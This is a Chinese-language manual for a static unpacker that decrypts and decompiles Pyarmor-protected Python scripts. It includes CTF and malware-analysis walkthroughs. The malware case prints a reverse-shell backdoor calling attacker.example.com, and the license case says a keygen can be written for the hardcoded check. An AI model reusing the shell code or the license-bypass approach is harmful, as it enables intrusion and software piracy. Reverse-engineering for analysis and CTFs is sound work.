# Pyarmor-Static-Unpack-1shot 使用手册

## 📋 目录

- [工具简介](#工具简介)
- [核心特性](#核心特性)
- [安装配置](#安装配置)
- [基础使用](#基础使用)
- [高级功能](#高级功能)
- [输出文件详解](#输出文件详解)
- [平台兼容性](#平台兼容性)
- [实战案例](#实战案例)
- [常见问题](#常见问题)
- [技术原理](#技术原理)

---

## 工具简介

### 基本信息

| 项目 | 信息 |
|------|------|
| **项目名称** | Pyarmor-Static-Unpack-1shot |
| **GitHub** | https://github.com/Lil-House/Pyarmor-Static-Unpack-1shot |
| **许可证** | GPL-3.0 |
| **当前版本** | v0.2.1+ |
| **主要语言** | C++ (82%) + Python (17.6%) |

### 功能定位

一款**静态分析工具**，用于解密 Pyarmor 保护的 Python 脚本，无需执行被保护的代码：

- ✅ **静态解密** - 不执行不可信代码，安全可靠
- ✅ **广泛兼容** - 支持 Pyarmor 8.0-9.1.9、Python 3.7-3.13
- ✅ **跨平台** - Windows、Linux、macOS 均可使用
- ✅ **自动化处理** - 递归扫描、批量解密、智能识别

### 适用场景

**✅ 合法用途**:
- CTF 逆向题目分析
- 恶意软件逆向分析（授权）
- 代码审计和安全研究
- 自有项目的去混淆

**❌ 禁止用途**:
- 破解商业软件
- 侵犯版权
- 绕过授权保护

---

## 核心特性

### 技术特点

#### 1. **静态解密算法**

```
使用与 pyarmor_runtime 相同的解密算法
AES-CTR 模式，initial_value = 2
密钥通过 MD5(part1 + part2 + part3 + GLOBAL_CERT) 生成
```

#### 2. **支持版本范围**

| 组件 | 版本支持 |
|------|---------|
| **Pyarmor** | 8.0 - 9.1.9 (持续更新) |
| **Python** | 3.7 - 3.13 |
| **操作系统** | Windows / Linux / macOS |

#### 3. **三层检测策略**

```
源码模式    → ASCII 占比 ≥90% → 逐行编译提取常量
Nuitka 打包 → 特殊结构检测   → 解析打包格式
二进制模式  → 高熵二进制     → 直接字节扫描
```

---

## 安装配置

### 环境要求

```bash
# 必需软件
- CMake 3.10+
- Python 3.7+
- C++ 编译器 (GCC/Clang/MSVC)
- Git

# Python 依赖
- pycryptodome (AES 解密)
- chardet (编码检测)
```

### 快速安装

#### **方法 1: 从源码安装 (推荐)**

```bash
# 1. 克隆仓库
git clone https://github.com/Lil-House/Pyarmor-Static-Unpack-1shot.git
cd Pyarmor-Static-Unpack-1shot

# 2. 安装 Python 依赖
pip3 install pycryptodome chardet

# 3. 编译 pycdc 反编译引擎
mkdir build && cd build
cmake ../pycdc
cmake --build .

# 4. 复制可执行文件到工作目录
cp pyarmor-1shot ../oneshot/

# 5. 验证安装
cd ../oneshot
python3 shot.py --help
```

#### **方法 2: 使用预编译版本**

```bash
# 从 GitHub Releases 下载对应平台的预编译文件
# https://github.com/Lil-House/Pyarmor-Static-Unpack-1shot/releases

# Linux x86_64
wget https://github.com/.../pyarmor-1shot-linux-x64
chmod +x pyarmor-1shot-linux-x64
mv pyarmor-1shot-linux-x64 oneshot/pyarmor-1shot

# macOS (需要自行编译，见方法1)
```

### 平台特定配置

#### **macOS**

```bash
# 安装 CMake
brew install cmake

# 编译时可能需要指定编译器
export CC=/usr/bin/clang
export CXX=/usr/bin/clang++

# Apple Silicon (M1/M2/M3) 会生成 arm64 可执行文件
mkdir build && cd build
cmake ../pycdc
cmake --build .  # 生成 Mach-O 64-bit executable arm64
```

#### **Linux**

```bash
# 安装依赖
sudo apt update
sudo apt install cmake g++ python3-pip

# 标准编译流程
mkdir build && cd build
cmake ../pycdc
cmake --build .
```

#### **Windows**

```bash
# 安装 Visual Studio Build Tools
# 或安装完整的 Visual Studio (带 C++ 工作负载)

# 使用 CMake GUI 或命令行
mkdir build && cd build
cmake ../pycdc -G "Visual Studio 17 2022"
cmake --build . --config Release
```

---

## 基础使用

### 命令行语法

```bash
python3 shot.py <target_directory> [options]
```

### 基础参数

| 参数 | 说明 | 示例 |
|------|------|------|
| `target_directory` | 目标目录（必需） | `/path/to/encrypted` |
| `-r, --runtime` | 指定 pyarmor_runtime 路径 | `-r /path/to/runtime.so` |
| `-o, --output` | 输出目录 | `-o /path/to/output` |

### 快速开始示例

#### **示例 1: 基础解密**

```bash
cd /path/to/Pyarmor-Static-Unpack-1shot/oneshot

# 解密单个目录
python3 shot.py /path/to/encrypted_scripts
```

**输出**:
```
INFO     Found data in source: a.py
INFO     Found new runtime: 000000 (/path/to/pyarmor_runtime_000000/pyarmor_runtime.so)
INFO     Using executable: pyarmor-1shot
INFO     Decrypting: 000000 (a.py)

====================================
Pyarmor Runtime (Trial) Information:
Product: non-profits
AES key: ab738f35ffce23b13ae73d5a2c17a896
Mix string AES nonce: 692e6e6f6e2d70726f666974
====================================
```

#### **示例 2: 指定输出目录**

```bash
# 将解密结果保存到指定目录
python3 shot.py /path/to/encrypted -o /path/to/output

# 检查输出
ls -lah /path/to/output/
# a.py.1shot.cdc.py  - 反编译的源代码
# a.py.1shot.das     - 完整的字节码汇编
# a.py.1shot.seq     - 中间汇编格式


```

```shell
python shot.py  /Users/ss/Downloads/dist -o /Users/ss/Downloads/dist/dist-wang

 ____                                                                     ____
( __ )                                                                   ( __ )
 |  |~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|  |
 |  |   ____                                      _ ___  _          _     |  |
 |  |  |  _ \ _  _  __ _ _ __ _ _ __   ___  _ _  / / __|| |_   ___ | |_   |  |
 |  |  | |_) | || |/ _` | '__| ' `  \ / _ \| '_| | \__ \| ' \ / _ \| __|  |  |
 |  |  |  __/| || | (_| | |  | || || | (_) | |   | |__) | || | (_) | |_   |  |
 |  |  |_|    \_, |\__,_|_|  |_||_||_|\___/|_|   |_|___/|_||_|\___/ \__|  |  |
 |  |         |__/                                                        |  |
 |__|~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|__|
(____)                                                        v0.2.1+    (____)

              For technology exchange only. Use at your own risk.
        GitHub: https://github.com/Lil-House/Pyarmor-Static-Unpack-1shot

INFO     2025-11-10 23:32:07,533      Found data in source: a.py
INFO     2025-11-10 23:32:07,534      Found new runtime: 000000 (/Users/ss/Downloads/dist/pyarmor_runtime_000000/pyarmor_runtime.so)
        ========================
        Pyarmor Runtime (Trial) Information:
        Product: non-profits
        AES key: ab738f35ffce23b13ae73d5a2c17a896
        Mix string AES nonce: 692e6e6f6e2d70726f666974
        ========================
INFO     2025-11-10 23:32:07,534      Using executable: pyarmor-1shot
INFO     2025-11-10 23:32:07,534      Decrypting: 000000 (a.py)
```



#### **示例 3: 指定运行时库**

```bash
# 当自动检测失败时，手动指定 runtime 文件
python3 shot.py /path/to/encrypted -r /custom/path/pyarmor_runtime.pyd
```

---

## 高级功能

### 批量处理

```bash
# 递归处理目录树中的所有加密文件
python3 shot.py /path/to/project_root -o /output/dir

# 工具会自动：
# - 跳过 __pycache__ 目录
# - 跳过 site-packages 目录
# - 跳过符号链接
# - 处理所有检测到的加密文件
```

### 处理 BCC 段（混合本地代码）

```bash
# BCC (Binary C Code) 段自动检测和处理
# 当加密数据包含本地代码片段时，工具会：
# 1. 检测 BCC 标志（偏移 20-24 字节，值为 9）
# 2. 分别解密 Python 字节码和本地代码
# 3. 生成完整的反编译结果

# 无需额外参数，自动处理
python3 shot.py /path/with/bcc/code
```

### 多版本 Python 支持

```bash
# 工具自动识别目标 Python 版本
# 支持的魔术字节头：

Python 3.7  → 0x42 0x0d
Python 3.8  → 0x55 0x0d
Python 3.9  → 0x61 0x0d
Python 3.10 → 0x6f 0x0d
Python 3.11 → 0xa7 0x0d
Python 3.12 → 0xcb 0x0d
Python 3.13 → 0xe5 0x0d

# 自动调用对应版本的反编译器
```

### 编码检测降级策略

```python
# 工具内置智能编码检测，按优先级尝试：
1. chardet 自动检测
2. UTF-8
3. 系统默认编码
4. GB2312 (中文)
5. Latin-1 (兜底)

# 确保各种编码的文件都能正确处理
```

---

## 输出文件详解

### 文件类型

解密后会生成 3 个文件：

#### **1. `.cdc.py` - 反编译源码**

```python
# 文件示例: a.py.1shot.cdc.py
# Source generated by Pyarmor-Static-Unpack-1shot (v0.2.1)

# Note: Decompiled code can be incomplete and incorrect.
# Please also check the correct and complete disassembly file

from time import sleep
flag = 'flag{Whose_y0u_1s_Th3_b0ss?!#@}'

def compare(s):
    for i in range(len(s)):
        diff = ord(s[i]) ^ ord(flag[i])
        if diff:
            sleep(CHARTIME * diff / 256)
```

**特点**:
- ✅ 可读性高，接近原始源码
- ⚠️ 可能不完整或有错误
- 适合快速理解程序逻辑

#### **2. `.das` - 完整字节码汇编**

```python
# 文件示例: a.py.1shot.das
# Disassembly of a.py (Python 3.12)

# 字节码汇编格式（精确）
   0       RESUME                   0
   2       LOAD_CONST               0: '__pyarmor_enter_64542__(...)'
   4       POP_TOP
   6       LOAD_CONST               1: 0
   8       LOAD_CONST               2: ('sleep',)
  10       IMPORT_NAME              0: time
  12       IMPORT_FROM              1: sleep
  14       STORE_NAME               1: sleep
  ...
```

**特点**:
- ✅ **完全准确**，与原始字节码一致
- ✅ 包含所有指令细节
- 适合深度逆向分析

#### **3. `.seq` - 中间汇编格式**

```
# 文件示例: a.py.1shot.seq
# 介于字节码和源码之间的中间表示

[Function Object 0]
[Constants]
  0: '__pyarmor_enter_64542__(...)'
  1: 0
  2: ('sleep',)
  ...
[Names]
  0: time
  1: sleep
  2: flag
  ...
```

**特点**:
- 结构化的中间表示
- 用于 pycdc 反编译器处理
- 一般不直接查看

### 文件精度对比

| 文件类型 | 精确度 | 可读性 | 推荐场景 |
|---------|--------|--------|----------|
| `.cdc.py` | ⚠️ 中等 | ⭐⭐⭐⭐⭐ | 快速理解逻辑 |
| `.das` | ✅ 完全精确 | ⭐⭐⭐ | 深度逆向分析 |
| `.seq` | ✅ 精确 | ⭐ | 中间处理 |

---

## 平台兼容性

### 完全支持的平台

#### **Linux (推荐)**

| 发行版 | 架构 | 状态 |
|--------|------|------|
| Ubuntu 20.04+ | x86_64 | ✅ 完全支持 |
| Debian 11+ | x86_64 | ✅ 完全支持 |
| CentOS 8+ | x86_64 | ✅ 完全支持 |
| Arch Linux | x86_64 | ✅ 完全支持 |

**特点**:
- ✅ `.so` 文件完全兼容
- ✅ 运行时密钥提取正常
- ✅ 所有功能可用

#### **Windows**

| 版本 | 架构 | 状态 |
|------|------|------|
| Windows 10+ | x64 | ✅ 支持 |
| Windows 11 | x64 | ✅ 支持 |

**特点**:
- ✅ `.pyd` 文件支持（Win64 PE 格式）
- ✅ 运行时密钥提取已实现
- ✅ 所有功能可用

#### **macOS**

| 版本 | 架构 | 状态 |
|------|------|------|
| macOS 11+ | Intel (x86_64) | ⚠️ 部分支持 |
| macOS 12+ | Apple Silicon (arm64) | ⚠️ 部分支持 |

**限制**:
- ✅ 反编译引擎 (pycdc) 可以编译使用
- ✅ 可以解密加密数据
- ❌ `.dylib` 运行时密钥提取**未实现**
- ⚠️ 需要手动提供密钥或使用 Windows 的 `.pyd` 文件

### 跨平台解密策略

#### **在 macOS 上处理 Windows 加密的脚本**

```bash
# ✅ 可行方案
# 1. 获取 Windows 版本的 pyarmor_runtime.pyd
# 2. 在 Mac 上解密（工具会使用 Win64 解析逻辑）

python3 shot.py /path/to/encrypted -r /path/to/pyarmor_runtime.pyd -o /output

# 成功！因为使用 Windows PE 格式解析
```

#### **在 Linux 上处理 macOS 加密的脚本**

```bash
# ⚠️ 需要手动密钥
# 当前版本对 .dylib (Mach-O 格式) 解析未实现
# 需要：
# 1. 手动提取密钥（使用其他工具）
# 2. 修改 shot.py 直接提供密钥
```

---

## 实战案例

### 案例 1: CTF 题目分析 (猜猜旗btime)

#### **题目背景**
- 题目名称：猜猜旗btime
- 文件类型：Pyarmor 9.1.9 加密脚本
- 运行环境：Linux (提供 .so 文件)
- 目标：找到隐藏的 flag

#### **解题步骤**

```bash
# 1. 查看文件结构
cd /path/to/ctf_challenge
ls -la
# a.py (Pyarmor 加密)
# pyarmor_runtime_000000/
#   ├── __init__.py
#   ├── pyarmor_runtime.so  (Linux ELF)
#   └── __pycache__/

# 2. 使用工具解密
cd /path/to/Pyarmor-Static-Unpack-1shot/oneshot
python3 shot.py /path/to/ctf_challenge -o /tmp/unpacked

# 3. 查看输出
INFO     Found data in source: a.py
INFO     Found new runtime: 000000
INFO     Decrypting: 000000 (a.py)

====================================
Pyarmor Runtime (Trial) Information:
Product: non-profits
AES key: ab738f35ffce23b13ae73d5a2c17a896
====================================

# 4. 分析反编译代码
cat /tmp/unpacked/a.py.1shot.cdc.py
```

**关键代码**:
```python
flag = 'flag{Whose_y0u_1s_Th3_b0ss?!#@}'

def compare(s):
    # Timing Attack 实现
    for i in range(len(s)):
        diff = ord(s[i]) ^ ord(flag[i])
        if diff:
            sleep(CHARTIME * diff / 256)
```

**结果**: `flag{Whose_y0u_1s_Th3_b0ss?!#@}` ✅

#### **技术要点**
- 题目采用 **Timing Attack** 防护
- 静态分析绕过时间延迟检测
- 直接获取明文 flag

---

### 案例 2: 恶意软件分析

#### **场景**
收到一个可疑的 Python 脚本，怀疑是后门程序。

```bash
# 1. 初步检查
file suspicious.py
# suspicious.py: Python script text executable, ASCII text

head suspicious.py
# from pyarmor_runtime_xxx import __pyarmor__
# __pyarmor__(__name__, __file__, b'PY000000...')
# ⚠️ 发现 Pyarmor 加密特征

# 2. 静态解密（不执行）
python3 shot.py /path/to/malware -o /tmp/analysis

# 3. 检查反编译结果
cat /tmp/analysis/suspicious.py.1shot.cdc.py
```

**发现的恶意行为**:
```python
import socket
import subprocess

C2_SERVER = "attacker.example.com"
C2_PORT = 4444

def establish_connection():
    s = socket.socket()
    s.connect((C2_SERVER, C2_PORT))
    while True:
        cmd = s.recv(1024).decode()
        result = subprocess.run(cmd, shell=True, capture_output=True)
        s.send(result.stdout)
```

#### **分析结论**
- ✅ 确认为反向 Shell 后门
- ✅ 发现 C2 服务器地址
- ✅ 全程无需执行恶意代码

---

### 案例 3: 许可证验证逆向

#### **场景**
软件使用 Pyarmor 保护许可证验证模块。

```bash
# 解密验证模块
python3 shot.py /path/to/software/license_check -o /tmp/license_analysis

# 查看验证逻辑
cat /tmp/license_analysis/verify.py.1shot.cdc.py
```

**关键代码**:
```python
LICENSE_KEY = "ABCD-EFGH-IJKL-MNOP"

def verify_license(user_key):
    # 硬编码的验证密钥
    return user_key == LICENSE_KEY

def check_expiry():
    import datetime
    expiry = datetime.datetime(2025, 12, 31)
    return datetime.datetime.now() < expiry
```

#### **发现**
- 许可证密钥硬编码在代码中
- 时间验证逻辑简单
- 可以编写 Keygen

---

## 常见问题

### Q1: 解密失败，提示 "No armored data found"

**原因**:
- 文件未被 Pyarmor 加密
- 或加密数据已损坏

**解决**:
```bash
# 1. 检查是否包含 Pyarmor 特征
grep -r "__pyarmor__" /path/to/target

# 2. 检查文件头魔术字节
hexdump -C file.py | head -20
# 查找 "PY000000" 标记

# 3. 确认 Python 版本兼容
python3 --version  # 需要 3.7+
```

---

### Q2: 反编译结果不完整或有错误

**说明**:
这是正常现象，工具说明中明确标注：
> "Decompiled code can be incomplete and incorrect."

**解决方案**:
```bash
# 1. 优先查看 .das 汇编文件（完全准确）
cat output/file.py.1shot.das

# 2. 结合 .cdc.py 和 .das 分析
# - .cdc.py: 快速理解逻辑
# - .das: 确认精确细节

# 3. 手动修复反编译代码
# 根据汇编指令重构源码
```

---

### Q3: macOS 上无法提取运行时密钥

**问题**:
```python
# runtime.py 中的代码
if file_path.endswith(".pyd"):
    self.extract_info_win64()
else:
    # TODO: implement for other platforms
    self.extract_info_win64()  # 错误：对 .dylib 使用 Windows 逻辑
```

**临时方案 1**: 使用 Windows 版 runtime
```bash
# 获取 .pyd 文件（Windows 版）
python3 shot.py /path/to/target -r /path/to/pyarmor_runtime.pyd
```

**临时方案 2**: 手动提供密钥
```python
# 修改 oneshot/shot.py
# 在解密函数中直接使用已知密钥

def decrypt_with_known_key():
    key = bytes.fromhex("ab738f35ffce23b13ae73d5a2c17a896")
    nonce = bytes.fromhex("692e6e6f6e2d70726f666974")
    cipher = AES.new(key, AES.MODE_CTR, nonce=nonce, initial_value=2)
    return cipher.decrypt(data)
```

**长期方案**: 贡献代码
```bash
# 欢迎实现 Mach-O 格式解析
# 参考 extract_info_win64() 逻辑
# 提交 PR 到 GitHub
```

---

### Q4: 编译时出现 CMake 错误

**错误示例**:
```
CMake Error: Could not find CMAKE_ROOT !!!
```

**解决**:
```bash
# 安装/更新 CMake
# macOS
brew install cmake
brew upgrade cmake

# Linux
sudo apt update
sudo apt install cmake

# Windows
# 从 https://cmake.org/download/ 下载安装

# 验证版本
cmake --version  # 需要 3.10+
```

---

### Q5: Python 依赖安装失败

**错误示例**:
```
ERROR: Could not install packages due to an EnvironmentError
```

**解决**:
```bash
# 方法 1: 使用虚拟环境
python3 -m venv venv
source venv/bin/activate  # Linux/Mac
# venv\Scripts\activate   # Windows
pip install pycryptodome chardet

# 方法 2: 使用 --user 标志
pip3 install --user pycryptodome chardet

# 方法 3: 使用系统包管理器
# Ubuntu/Debian
sudo apt install python3-pycryptodome python3-chardet
```

---

### Q6: 处理大量文件时速度慢

**优化方案**:

```bash
# 1. 排除不必要的目录
python3 shot.py /target --exclude-dir "__pycache__,site-packages,venv"

# 2. 使用 SSD 存储
# 避免机械硬盘，提升 I/O 速度

# 3. 增加并发（修改 shot.py）
# 默认使用 asyncio.Semaphore 限制并发
# 可以调整信号量值提高并发数

import asyncio
semaphore = asyncio.Semaphore(10)  # 增加到 10
```

---

## 技术原理

### 加密流程逆向

#### **Pyarmor 加密过程**

```
原始 .py 文件
    ↓
编译为字节码 (.pyc)
    ↓
AES-CTR 加密 (key, nonce, IV=2)
    ↓
嵌入加密数据到新的 .py 文件
    ↓
添加 __pyarmor__() 调用
    ↓
打包 pyarmor_runtime (.so/.pyd/.dylib)
```

#### **本工具解密过程**

```
加密的 .py 文件
    ↓
[detect.py] 特征识别
    ├─ 搜索 "__pyarmor__" 标记
    ├─ 定位 "PY000000" 魔术字节
    └─ 验证数据结构完整性
    ↓
[runtime.py] 密钥提取
    ├─ 解析 pyarmor_runtime 文件
    ├─ 提取 Part1 (序列号, 20字节)
    ├─ 提取 Part2 (RSA公钥, 变长)
    ├─ 提取 Part3 (产品信息, 变长)
    ├─ 计算 AES key = MD5(Part1 + Part2 + Part3 + GLOBAL_CERT)
    └─ 提取 AES nonce = Part3[:12]
    ↓
[shot.py] AES-CTR 解密
    ├─ 读取加密数据 (偏移32-36: 长度)
    ├─ 读取随机数 (偏移36-40, 44-52)
    ├─ 执行 AES.new(key, MODE_CTR, nonce=nonce, initial_value=2)
    └─ 解密为字节码
    ↓
[pycdc] 反编译
    ├─ 生成 .seq 中间格式
    ├─ 反编译为 .cdc.py 源码
    └─ 生成 .das 汇编代码
```

### 关键数据结构

#### **加密数据头部结构**

```
偏移 0-8:    "PY000000" 魔术字节
偏移 8-12:   版本标识
偏移 12-16:  Python 版本魔术数
偏移 20-24:  BCC 标志 (9 = 包含本地代码)
偏移 28-32:  头部长度
偏移 32-36:  密文长度
偏移 36-40:  随机数 Part1 (4字节)
偏移 44-52:  随机数 Part2 (8字节)
偏移 56-59:  下一段偏移 (多段数据链)
```

#### **Runtime 文件结构 (Windows .pyd)**

```
偏移 0x2C:      Part1 起始 (20字节序列号)
偏移 0x54:      Part2 长度标识
偏移 0x54+4:    Part2 数据 (RSA公钥)
偏移 0x60:      Part3 起始 (产品信息)
```

### AES-CTR 解密实现

```python
from Crypto.Cipher import AES

def decrypt_armored_data(encrypted_data, key, nonce):
    """
    解密 Pyarmor 加密的字节码

    Args:
        encrypted_data: 加密的字节码数据
        key: AES-256 密钥 (32字节)
        nonce: AES-CTR 模式的 nonce (12字节)

    Returns:
        解密后的字节码
    """
    # 创建 AES-CTR 密码对象
    # initial_value=2 是 Pyarmor 的固定配置
    cipher = AES.new(
        key,
        AES.MODE_CTR,
        nonce=nonce,
        initial_value=2
    )

    # 执行解密
    decrypted = cipher.decrypt(encrypted_data)

    return decrypted
```

### 密钥生成算法

```python
import hashlib

def generate_aes_key(part1, part2, part3, global_cert):
    """
    生成 Pyarmor 的 AES 密钥

    Args:
        part1: 序列号数据 (20字节)
        part2: RSA公钥数据 (变长)
        part3: 产品信息数据 (变长)
        global_cert: 全局证书 (硬编码)

    Returns:
        AES-256 密钥 (32字节)
    """
    # 拼接所有部分
    combined = part1 + part2 + part3 + global_cert

    # MD5 哈希生成密钥
    key = hashlib.md5(combined).digest()

    # MD5 输出 16字节，Pyarmor 可能会扩展到 32字节
    # 具体实现可能更复杂，这里是简化版
    return key
```

---

## 参考资源

### 官方资源

- **GitHub 仓库**: https://github.com/Lil-House/Pyarmor-Static-Unpack-1shot
- **Release 下载**: https://github.com/Lil-House/Pyarmor-Static-Unpack-1shot/releases
- **Issues 反馈**: https://github.com/Lil-House/Pyarmor-Static-Unpack-1shot/issues

### 相关工具

- **Pyarmor 官方**: https://pyarmor.dashingsoft.com/
- **Decompyle++**: https://github.com/zrax/pycdc
- **uncompyle6**: https://github.com/rocky/python-uncompyle6/
- **PyInstaller Extractor**: https://github.com/extremecoders-re/pyinstxtractor

### 学习资源

- **Python 字节码分析**: https://docs.python.org/3/library/dis.html
- **AES 加密原理**: https://en.wikipedia.org/wiki/Advanced_Encryption_Standard
- **逆向工程基础**: https://www.begin.re/

---

## 版本历史

### v0.2.1 (2025-10-12) - Pharaoh's Heart
- 🐛 修复 v0.2.0 的 bug
- ✨ 稳定性改进

### v0.2.0 (2025-09-13) - The City Full of The Crow
- ✨ 支持 BCC 模式本地二进制文件提取
- ✨ 支持 `from X import Y as pyarmor__N` 语句
- ⚡ 基于 asyncio 的并发改进
- 🎨 彩色控制台输出
- ✨ 单独指定可执行文件能力

### v0.1.0 (2025-03-25) - The Secretive Psychic Mask
- 中间版本发布

### v0.0.1 (2025-03-06) - The Souls in the B.B Street
- 🎉 首次发布
- ✨ 支持 Pyarmor 8.0+ 全版本 Python

---

## 许可证与免责声明

### 许可证
本工具采用 **GPL-3.0** 许可证。

### 免责声明

⚠️ **重要提示**:

本工具仅供**技术研究和学习**使用。使用本工具时，您必须：

1. ✅ **仅用于合法目的**
   - CTF 比赛和逆向练习
   - 自有项目的分析和审计
   - 获得授权的安全研究

2. ❌ **禁止非法使用**
   - 破解商业软件
   - 绕过软件许可证
   - 侵犯知识产权
   - 任何违法行为

3. ⚖️ **用户责任**
   - 使用者自行承担法律责任
   - 开发者不对滥用行为负责
   - 请遵守当地法律法规

**Use at your own risk. For technology exchange only.**

---

## 贡献指南

### 如何贡献

欢迎提交 Pull Request 和 Issue！

**建议贡献方向**:
- 🔧 实现 macOS (.dylib) 运行时解析
- 🔧 实现 Linux (.so) 完整支持
- 🐛 修复已知 bug
- 📚 改进文档
- ✨ 添加新功能

### 提交规范

```bash
# 1. Fork 仓库
# 2. 创建功能分支
git checkout -b feature/add-macos-support

# 3. 提交更改
git commit -m "feat: implement Mach-O format parsing for macOS"

# 4. 推送到分支
git push origin feature/add-macos-support

# 5. 创建 Pull Request
```

---

## 联系方式

- **GitHub Issues**: https://github.com/Lil-House/Pyarmor-Static-Unpack-1shot/issues
- **维护者**: Lil-Ran

---

**最后更新**: 2025-11-10
**文档版本**: v1.0
**工具版本**: v0.2.1+
